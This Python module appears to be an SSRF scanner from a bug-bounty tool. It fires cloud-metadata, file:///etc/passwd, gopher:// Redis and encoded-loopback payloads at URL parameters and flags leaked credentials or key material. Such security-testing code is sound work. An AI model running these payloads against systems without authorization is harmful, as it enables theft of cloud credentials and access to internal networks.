"""
BLFinder — core/modules/ssrf_scanner.py
Server-Side Request Forgery (SSRF) Scanner

SSRF is one of the highest-value, highest-payout bug classes on HackerOne
(cloud credential theft, internal network pivoting) but it's also one of the
easiest classes to fill a report with garbage on — most scanners either fire
one metadata-IP payload at every parameter and call anything non-timeout a
"finding", or they never fire at all because they can't tell a URL-shaped
parameter from a plain string. This module tries to do neither.

Strategy — four independent evidence tiers, escalating in reliability:

  Tier 1 — In-band cloud metadata confirmation (near-zero FP rate)
      Point candidate URL parameters at the well-known cloud metadata
      endpoints (AWS/GCP/Azure/Alibaba/DigitalOcean/Oracle) and grep the
      *response the app hands back to us* for metadata/credential
      signatures. If the app is a proxy/fetcher that echoes fetched
      content, this is direct, self-evident proof — no oracle needed.

  Tier 2 — Internal-network differential probing (blind, medium signal)
      Loopback / RFC1918 / link-local targets, plus classic allow-list
      bypass encodings (decimal/octal/hex IP, IPv6-mapped, userinfo
      confusion). Since the response is blind, this is only ever reported
      as a *lead* (capped confidence, confirmed=False) driven by a
      statistically significant timing delta against a genuinely
      unroutable control host — never on "it didn't crash" alone.

  Tier 3 — Out-of-band (OOB) interaction confirmation (near-zero FP rate,
      opt-in). If the operator supplies a collaborator/interactsh-style
      domain via `config.ssrf_oob_domain` (and optionally a poller via
      `config.ssrf_oob_checker`), each candidate parameter is fired at a
      per-request unique subdomain. A correlated DNS/HTTP hit against that
      unique nonce is unambiguous proof of network egress from the server,
      independent of what (if anything) the HTTP response shows.

  Tier 4 — Scheme/protocol acceptance probing (contextual, not standalone)
      Tests whether non-http(s) schemes (file://, gopher://, dict://) are
      silently accepted the same way a normal https:// URL is. This never
      generates its own finding; it only raises the severity/confidence of
      a Tier 1/2/3 finding on the same parameter, because it indicates the
      lack of a scheme allow-list (turning SSRF into LFI/port-scanning/
      Redis-gopher-RCE territory).

Candidate parameters are discovered from the endpoint's query params and
JSON/form body (recursively), by name heuristic ("url", "callback",
"webhook", "avatar", ...) OR by value shape (already looks like a URL) —
plus a path-based heuristic for URL-fetching *features* (webhook config,
screenshot/PDF renderers, URL-preview/unfurl, import-from-URL) even when no
parameter matched by name, since those often hide the URL field under an
unpredictable name.

Every finding is deduplicated per (host, parameter, tier) — SSRF is a
property of how a given parameter is handled, not of the specific payload
byte-string used to prove it.
"""

from __future__ import annotations

import random
import re
import string
from urllib.parse import urlparse, urlencode, quote

from ..models import Finding, Severity, ProofOfConcept

try:
    from ..oracles.timing_oracle import TimingOracle
    _HAS_TIMING_ORACLE = True
except ImportError:
    _HAS_TIMING_ORACLE = False




_URL_PARAM_NAME_RE = re.compile(
    r"(url|uri|link|href|src|source|target|dest|destination|redirect|"
    r"return[_-]?to|callback|webhook|notify|feed|proxy|fetch|import|"
    r"upload|avatar|image|img|thumbnail|preview|unfurl|screenshot|"
    r"render|host|domain|endpoint|api[_-]?url|next|continue|out|remote|"
    r"path|file|document|site|page|resource|location|forward)",
    re.IGNORECASE,
)
_URL_VALUE_RE = re.compile(r"^(https?:)?//", re.IGNORECASE)




_SSRF_FEATURE_PATH_RE = re.compile(
    r"/(webhook|callback|notify|proxy|fetch|import|unfurl|preview|"
    r"screenshot|render|pdf|thumbnail|avatar|image[_-]?upload|"
    r"upload[_-]?from[_-]?url|link[_-]?preview|url[_-]?preview|"
    r"scrape|crawl|mirror|export|share|embed)",
    re.IGNORECASE,
)



_METADATA_SIGNATURES = [
    (re.compile(r"ami-id|instance-id|iam/security-credentials", re.IGNORECASE), "AWS EC2 instance metadata"),
    (re.compile(r'"accesskeyid"|"secretaccesskey"|"sessiontoken"', re.IGNORECASE), "AWS temporary IAM credentials"),
    (re.compile(r"computemetadata|metadata\.google\.internal", re.IGNORECASE), "GCP compute metadata"),
    (re.compile(r'"access_token".{0,40}"expires_in"', re.IGNORECASE), "GCP/OAuth service-account token"),
    (re.compile(r'"compute":\s*{|azEnvironment|"subscriptionId"', re.IGNORECASE), "Azure instance metadata"),
    (re.compile(r"100\.100\.100\.200|alibaba", re.IGNORECASE), "Alibaba Cloud ECS metadata"),
    (re.compile(r'"droplet_id"|digitalocean', re.IGNORECASE), "DigitalOcean droplet metadata"),
    (re.compile(r"-----BEGIN (RSA|OPENSSH|EC|DSA|PRIVATE) ?PRIVATE KEY-----|-----BEGIN OPENSSH PRIVATE KEY-----", re.IGNORECASE), "Embedded private key material"),
    (re.compile(r'"kty"\s*:\s*"(RSA|EC)"', re.IGNORECASE), "JSON Web Key material"),
    (re.compile(r"root:.*:0:0:", re.IGNORECASE), "/etc/passwd contents (file:// read)"),
]







_METADATA_PAYLOADS = [
    ("aws_latest",      "http://169.254.169.254/latest/meta-data/", None),
    ("aws_iam_creds",   "http://169.254.169.254/latest/meta-data/iam/security-credentials/", None),
    ("aws_imdsv2_hint", "http://[fd00:ec2::254]/latest/meta-data/", None),
    ("gcp_metadata",    "http://metadata.google.internal/computeMetadata/v1/", "Metadata-Flavor: Google"),
    ("azure_metadata",  "http://169.254.169.254/metadata/instance?api-version=2021-02-01", "Metadata: true"),
    ("alibaba_metadata","http://100.100.100.200/latest/meta-data/", None),
    ("digitalocean_md", "http://169.254.169.254/metadata/v1.json", None),
    ("oracle_metadata", "http://192.0.0.192/latest/meta-data/", None),
    ("file_etc_passwd", "file:///etc/passwd", None),
]



_INTERNAL_PAYLOADS = [
    ("loopback_plain",     "http://127.0.0.1/"),
    ("loopback_localhost", "http://localhost/"),
    ("loopback_decimal",   "http://2130706433/"),          
    ("loopback_octal",     "http://0177.0000.0000.0001/"),  
    ("loopback_hex",       "http://0x7f.0x0.0x0.0x1/"),      
    ("loopback_ipv6",      "http://[::1]/"),
    ("loopback_ipv6_mapped", "http://[::ffff:127.0.0.1]/"),
    ("link_local_aws",     "http://169.254.169.254/"),      
    ("rfc1918_10",         "http://10.0.0.1/"),
    ("rfc1918_172",        "http://172.16.0.1/"),
    ("rfc1918_192",        "http://192.168.0.1/"),
    ("zero_addr",          "http://0.0.0.0/"),
]

_PROTOCOL_PAYLOADS = [
    ("scheme_file",   "file:///etc/hostname"),
    ("scheme_gopher", "gopher://127.0.0.1:6379/_INFO%0d%0a"),
    ("scheme_dict",   "dict://127.0.0.1:11211/stats"),
]

_MAX_PARAMS_PER_ENDPOINT = 4   


class SSRFScanner:
    """
    Usage:
        ssrf = SSRFScanner(scanner)
        findings = await ssrf.check(url, method, params, body, headers, base_body)
        scanner.findings.extend(findings)
    """

    def __init__(self, scanner):
        self._scanner = scanner
        self._config = scanner.config
        self._request = scanner._request
        self._reported: set[tuple] = set()          
        self._timing_oracle = TimingOracle(scanner) if _HAS_TIMING_ORACLE else None
        self._oob_domain = getattr(self._config, "ssrf_oob_domain", "") or ""
        self._oob_checker = getattr(self._config, "ssrf_oob_checker", None)  



    async def check(
        self,
        url: str,
        method: str,
        params: dict | None = None,
        body: dict | None = None,
        headers: dict | None = None,
        base_body: str = "",
    ) -> list[Finding]:
        findings: list[Finding] = []
        parsed = urlparse(url)
        host = parsed.netloc
        if not host:
            return findings

        candidates = self._find_candidate_params(url, params or {}, body or {})
        if not candidates:
            return findings

        for location, param_path, current_value in candidates[:_MAX_PARAMS_PER_ENDPOINT]:
            dedup_base = (host, param_path)


            key1 = dedup_base + ("metadata",)
            if key1 not in self._reported:
                f = await self._probe_metadata(url, method, location, param_path, params, body, host)
                if f:
                    self._reported.add(key1)
                    findings.append(f)
                    continue  


            key3 = dedup_base + ("oob",)
            if self._oob_domain and key3 not in self._reported:
                f = await self._probe_oob(url, method, location, param_path, params, body, host)
                if f:
                    self._reported.add(key3)
                    findings.append(f)
                    continue


            key2 = dedup_base + ("internal",)
            if key2 not in self._reported:
                f = await self._probe_internal(url, method, location, param_path, params, body, host, base_body)
                if f:
                    self._reported.add(key2)
                    findings.append(f)

        return findings



    def _find_candidate_params(self, url: str, params: dict, body: dict) -> list[tuple]:
        """
        Returns list of (location, dotted_param_path, current_value) tuples.
        location is 'query' or 'body'.
        """
        candidates: list[tuple] = []

        def walk(obj, prefix: str, location: str, depth: int = 0):
            if depth > 4 or len(candidates) >= 12:
                return
            if isinstance(obj, dict):
                for k, v in obj.items():
                    path = f"{prefix}.{k}" if prefix else str(k)
                    if isinstance(v, (dict, list)):
                        walk(v, path, location, depth + 1)
                    elif isinstance(v, str):
                        if _URL_PARAM_NAME_RE.search(str(k)) or _URL_VALUE_RE.match(v.strip()):
                            candidates.append((location, path, v))
            elif isinstance(obj, list):
                for i, v in enumerate(obj):
                    walk(v, f"{prefix}[{i}]", location, depth + 1)

        walk(params, "", "query")
        walk(body, "", "body")





        if not candidates and _SSRF_FEATURE_PATH_RE.search(urlparse(url).path):
            for location, obj in (("query", params), ("body", body)):
                if isinstance(obj, dict):
                    for k, v in obj.items():
                        if isinstance(v, str) and v.strip():
                            candidates.append((location, str(k), v))
                            break

        return candidates



    async def _probe_metadata(
        self, url, method, location, param_path, params, body, host,
    ) -> Finding | None:
        for label, payload_url, header_hint in _METADATA_PAYLOADS:
            try:
                status, resp_headers, resp_body, elapsed = await self._send_with_param(
                    method, url, location, param_path, payload_url, params, body,
                )
            except Exception as e:
                if self._config.verbose:
                    print(f"[!] SSRFScanner metadata probe '{label}' on {url}: {e}")
                continue
            if status == 0:
                continue

            scan_body = resp_body.replace(payload_url, "").replace(quote(payload_url, safe=""), "")
            for sig_re, sig_name in _METADATA_SIGNATURES:
                if sig_re.search(scan_body):
                    scheme_note = await self._protocol_acceptance_note(
                        method, url, location, param_path, params, body,
                    )
                    return self._build_metadata_finding(
                        url, method, param_path, payload_url, label, sig_name,
                        resp_body, host, scheme_note,
                    )
        return None



    async def _probe_internal(
        self, url, method, location, param_path, params, body, host, base_body,
    ) -> Finding | None:
        if not self._timing_oracle:
            return None





        control_host = f"{self._nonce()}.invalid-{self._nonce(4)}.test"
        control_url = f"http://{control_host}/"

        best_result = None
        best_payload = None
        for label, payload_url in _INTERNAL_PAYLOADS:
            async def req_internal(pu=payload_url):
                return await self._send_with_param(method, url, location, param_path, pu, params, body)

            async def req_control():
                return await self._send_with_param(method, url, location, param_path, control_url, params, body)

            try:
                result = await self._timing_oracle.compare(
                    request_a=req_control,
                    request_b=req_internal,
                    description=f"SSRF blind probe: control vs {label}",
                    samples=4,          
                    interleave=True,
                )
            except Exception as e:
                if self._config.verbose:
                    print(f"[!] SSRFScanner internal probe '{label}' on {url}: {e}")
                continue

            if result.is_significant and result.confidence >= 0.6:
                if best_result is None or result.confidence > best_result.confidence:
                    best_result = result
                    best_payload = (label, payload_url)

        if not best_result or not best_payload:
            return None

        return self._build_internal_lead_finding(
            url, method, param_path, best_payload[1], best_payload[0],
            host, best_result,
        )



    async def _probe_oob(
        self, url, method, location, param_path, params, body, host,
    ) -> Finding | None:
        nonce = self._nonce(12)
        callback_host = f"{nonce}.{self._oob_domain}"
        payload_url = f"http://{callback_host}/ssrf-poc"

        try:
            status, _, _, _ = await self._send_with_param(
                method, url, location, param_path, payload_url, params, body,
            )
        except Exception as e:
            if self._config.verbose:
                print(f"[!] SSRFScanner OOB probe on {url}: {e}")
            return None
        if status == 0:
            return None

        interacted = False
        if self._oob_checker:
            try:
                interacted = await self._oob_checker(nonce)
            except Exception as e:
                if self._config.verbose:
                    print(f"[!] SSRFScanner OOB checker error: {e}")

        if interacted:
            return self._build_oob_finding(url, method, param_path, payload_url, host, confirmed=True)





        if not self._oob_checker:
            return self._build_oob_finding(url, method, param_path, payload_url, host, confirmed=False)
        return None



    async def _protocol_acceptance_note(
        self, method, url, location, param_path, params, body,
    ) -> str:
        accepted = []
        for label, payload_url in _PROTOCOL_PAYLOADS:
            try:
                status, _, _, _ = await self._send_with_param(
                    method, url, location, param_path, payload_url, params, body,
                )
            except Exception:
                continue
            if status not in (0, 400, 422):
                accepted.append(label.replace("scheme_", ""))
        if accepted:
            return (
                f"Non-HTTP schemes were also accepted without rejection "
                f"({', '.join(accepted)}) — no scheme allow-list is enforced, "
                f"which extends impact beyond HTTP metadata theft to local file "
                f"read and internal-service protocol smuggling (e.g. Redis via gopher://)."
            )
        return ""



    async def _send_with_param(
        self, method, url, location, param_path, payload_value, params, body,
    ):
        """Rebuild params/body with `param_path` overridden to `payload_value`
        and issue the request, returning (status, headers, body, elapsed)."""
        new_params = dict(params) if params else {}
        new_body = self._deep_copy_json(body) if body else {}

        if location == "query":
            self._set_path(new_params, param_path, payload_value)
            return await self._request(method, url, params=new_params, json=new_body if new_body else None)
        else:
            self._set_path(new_body, param_path, payload_value)
            return await self._request(method, url, params=new_params if new_params else None, json=new_body)

    def _set_path(self, obj: dict, path: str, value):
        """Set a dotted/indexed path like 'a.b[0].c' inside a dict-of-dicts/lists."""
        tokens = re.findall(r"[^.\[\]]+|\[\d+\]", path)
        cur = obj
        for i, tok in enumerate(tokens):
            last = i == len(tokens) - 1
            if tok.startswith("["):
                idx = int(tok[1:-1])
                if not isinstance(cur, list):
                    return
                if idx >= len(cur):
                    return
                if last:
                    cur[idx] = value
                else:
                    cur = cur[idx]
            else:
                if not isinstance(cur, dict):
                    return
                if last:
                    cur[tok] = value
                else:
                    if tok not in cur or not isinstance(cur[tok], (dict, list)):
                        return
                    cur = cur[tok]

    def _deep_copy_json(self, obj):
        if isinstance(obj, dict):
            return {k: self._deep_copy_json(v) for k, v in obj.items()}
        if isinstance(obj, list):
            return [self._deep_copy_json(v) for v in obj]
        return obj

    def _nonce(self, n: int = 8) -> str:
        return "".join(random.choices(string.ascii_lowercase + string.digits, k=n))



    def _build_metadata_finding(
        self, url, method, param_path, payload_url, label, sig_name,
        resp_body, host, scheme_note,
    ) -> Finding:
        evidence_snippet = self._extract_snippet(resp_body, 300)
        curl = self._curl(url, method, param_path, payload_url)
        python_script = self._python_script(url, method, param_path, payload_url)

        description = (
            f"The `{param_path}` parameter on `{host}` accepts an attacker-controlled "
            f"URL and the server fetches it, returning fetched content back in the "
            f"response. Pointing it at `{payload_url}` (label: {label}) caused the "
            f"response to contain {sig_name}, proving the server made an outbound "
            f"request to a cloud metadata/internal service on the application's "
            f"behalf and leaked the result. This is a confirmed, in-band SSRF — "
            f"no blind oracle was needed."
        )
        if scheme_note:
            description += f"\n\n{scheme_note}"

        recommendation = (
            "Enforce a strict allow-list of destination hosts/schemes at the "
            "network layer (not just application code) for any feature that "
            "fetches a user-supplied URL. Block requests to 169.254.169.254, "
            "100.100.100.200, 192.0.0.192, metadata.google.internal, and all "
            "RFC1918/loopback/link-local ranges by default; require IMDSv2 with "
            "hop-limit 1 on AWS so metadata isn't reachable through a proxying "
            "app at all. Resolve DNS once and validate the resulting IP (not the "
            "hostname) immediately before connecting, to prevent DNS-rebinding "
            "bypasses of hostname-based allow-lists."
        )

        finding = Finding(
            title=f"Server-Side Request Forgery — Cloud Metadata/Internal Service Exposed via `{param_path}`",
            severity=Severity.CRITICAL,
            category="SSRF — Confirmed (In-Band)",
            description=description,
            request={"method": method, "url": url, "parameter": param_path, "payload": payload_url},
            response_summary=f"Response contained {sig_name}",
            evidence=f"Payload `{payload_url}` on `{param_path}` → response snippet: {evidence_snippet}",
            recommendation=recommendation,
            cwe="CWE-918",
            cvss=9.1,
            owasp="API7:2023 Server-Side Request Forgery",
            confirmed=True,
            confidence=96,
            confidence_reasons=[
                f"In-band response contained {sig_name}",
                f"Signature matched against known cloud metadata format ({label})",
            ],
            endpoint=url,
            parameter=param_path,
        )
        finding.poc = ProofOfConcept(
            summary=f"SSRF via `{param_path}` → {sig_name} leaked in response",
            curl_command=curl,
            python_script=python_script,
            burp_request=self._burp(url, method, host),
            expected_result=f"Response body contains {sig_name} (see evidence snippet above).",
            steps=[
                f"Send the request with `{param_path}` set to `{payload_url}`.",
                "Observe the response body contains cloud metadata/credential content.",
                "If credentials are present, use them to enumerate the cloud "
                "account's permissions (read-only checks such as GetCallerIdentity "
                "or equivalent) to demonstrate real-world impact for the report — "
                "do not perform any destructive action with stolen credentials.",
            ],
        )
        return finding

    def _build_internal_lead_finding(
        self, url, method, param_path, payload_url, label, host, timing_result,
    ) -> Finding:
        confidence = int(min(65, 30 + timing_result.confidence * 40))
        description = (
            f"The `{param_path}` parameter on `{host}` accepts an attacker-controlled "
            f"URL. Pointing it at internal/loopback address `{payload_url}` "
            f"(technique: {label}) produced a statistically significant timing "
            f"difference (Δ={timing_result.delta*1000:.1f}ms, effect size="
            f"{timing_result.effect_size:.2f}) compared to a request that targets a "
            f"guaranteed-unreachable control host, suggesting the server actually "
            f"attempted or completed a connection to the internal address rather "
            f"than rejecting it outright. This is a blind lead, not an in-band "
            f"confirmation — the response body did not directly disclose fetched "
            f"content, so manual verification (or OOB collaborator correlation, "
            f"see Tier 3) is recommended before reporting as a confirmed bug."
        )
        finding = Finding(
            title=f"Potential Blind SSRF — Internal Address Reachable via `{param_path}`",
            severity=Severity.MEDIUM,
            category="SSRF — Unconfirmed Lead (Blind/Timing)",
            description=description,
            request={"method": method, "url": url, "parameter": param_path, "payload": payload_url},
            response_summary="No content disclosure — timing-only signal",
            evidence=(
                f"Timing delta {timing_result.delta*1000:.1f}ms, "
                f"effect size {timing_result.effect_size:.2f}, "
                f"p≈{timing_result.p_value_approx:.3f} vs unreachable control host"
            ),
            recommendation=(
                "Manually verify with an out-of-band collaborator domain (or by "
                "configuring `ssrf_oob_domain`) before treating this as confirmed. "
                "If confirmed, apply the same network-layer allow-list "
                "recommendations as for the in-band metadata finding."
            ),
            cwe="CWE-918",
            cvss=5.3,
            owasp="API7:2023 Server-Side Request Forgery",
            confirmed=False,
            confidence=confidence,
            confidence_reasons=[
                f"Timing oracle flagged as significant (confidence={timing_result.confidence:.2f})",
            ],
            false_positive_checks=[
                "No in-band content disclosure — timing signal alone is not proof",
                "Network jitter can produce false timing deltas; re-verify manually",
            ],
            endpoint=url,
            parameter=param_path,
        )
        finding.poc = ProofOfConcept(
            summary=f"Timing-based blind SSRF lead on `{param_path}`",
            curl_command=self._curl(url, method, param_path, payload_url),
            python_script=self._python_script(url, method, param_path, payload_url),
            burp_request=self._burp(url, method, host),
            expected_result="Confirm with an OOB collaborator payload before reporting.",
            steps=[
                "Re-run with a Burp Collaborator / interactsh subdomain in place "
                f"of `{payload_url}`.",
                "Check the collaborator log for a DNS/HTTP interaction correlated "
                "to this request's timestamp.",
            ],
        )
        return finding

    def _build_oob_finding(
        self, url, method, param_path, payload_url, host, confirmed: bool,
    ) -> Finding:
        if confirmed:
            severity, confidence, tag = Severity.CRITICAL, 95, "Confirmed (Out-of-Band)"
            desc_tail = (
                "an out-of-band interaction (DNS/HTTP) was received on the "
                "correlated collaborator subdomain, proving the server made an "
                "outbound network connection to an attacker-designated host."
            )
        else:
            severity, confidence, tag = Severity.INFO, 30, "Unconfirmed — Manual OOB Check Required"
            desc_tail = (
                "no automated OOB poller was configured (`ssrf_oob_checker`), so "
                "this request was sent but not yet correlated — check your "
                "collaborator/interactsh log for this nonce manually."
            )

        finding = Finding(
            title=f"Server-Side Request Forgery — Out-of-Band Probe via `{param_path}`",
            severity=severity,
            category=f"SSRF — {tag}",
            description=(
                f"The `{param_path}` parameter on `{host}` was set to "
                f"`{payload_url}`, a unique collaborator subdomain; {desc_tail}"
            ),
            request={"method": method, "url": url, "parameter": param_path, "payload": payload_url},
            response_summary="N/A — evidence is out-of-band, not in the HTTP response",
            evidence=f"OOB payload sent: {payload_url}",
            recommendation=(
                "Enforce a destination allow-list validated against the resolved "
                "IP (not hostname) for any server-side fetch feature, and deny "
                "RFC1918/loopback/link-local ranges by default."
            ),
            cwe="CWE-918",
            cvss=9.1 if confirmed else 0.0,
            owasp="API7:2023 Server-Side Request Forgery",
            confirmed=confirmed,
            confidence=confidence,
            confidence_reasons=(
                ["Correlated OOB interaction received"] if confirmed
                else ["Payload sent; awaiting manual/automatic OOB correlation"]
            ),
            endpoint=url,
            parameter=param_path,
        )
        finding.poc = ProofOfConcept(
            summary="Blind SSRF via out-of-band collaborator interaction",
            curl_command=self._curl(url, method, param_path, payload_url),
            python_script=self._python_script(url, method, param_path, payload_url),
            burp_request=self._burp(url, method, host),
            expected_result="A DNS or HTTP hit appears in the collaborator log for this nonce.",
            steps=["Check your OOB collaborator/interactsh dashboard for the subdomain above."],
        )
        return finding



    def _curl(self, url, method, param_path, payload_url) -> str:
        return (
            f'curl -sk -X {method} "{url}" \\\n'
            f'  --data-urlencode "{param_path}={payload_url}" -i'
        )

    def _python_script(self, url, method, param_path, payload_url) -> str:
        return (
            "import requests\n\n"
            f'url = "{url}"\n'
            f'data = {{"{param_path}": "{payload_url}"}}\n'
            f'r = requests.request("{method}", url, json=data)\n'
            'print(r.status_code)\n'
            'print(r.text[:1000])\n'
        )

    def _burp(self, url, method, host) -> str:
        path = urlparse(url).path or "/"
        return f"{method} {path} HTTP/1.1\nHost: {host}\nContent-Type: application/json\nConnection: close\n\n"

    def _extract_snippet(self, body: str, length: int) -> str:
        for sig_re, _ in _METADATA_SIGNATURES:
            m = sig_re.search(body)
            if m:
                start = max(0, m.start() - 40)
                return body[start:start + length].replace("\n", " ")
        return body[:length]
